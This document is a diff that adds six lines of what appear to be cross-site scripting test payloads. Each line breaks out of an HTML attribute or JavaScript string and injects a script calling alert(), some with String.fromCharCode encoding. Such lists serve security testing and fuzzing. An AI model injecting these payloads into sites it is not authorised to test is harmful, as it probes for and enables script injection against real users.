@@ -1,0 +1,6 @@
+'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+'); alert('xss'); var x='
+\\'); alert(\'xss\');var x=\'
+//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
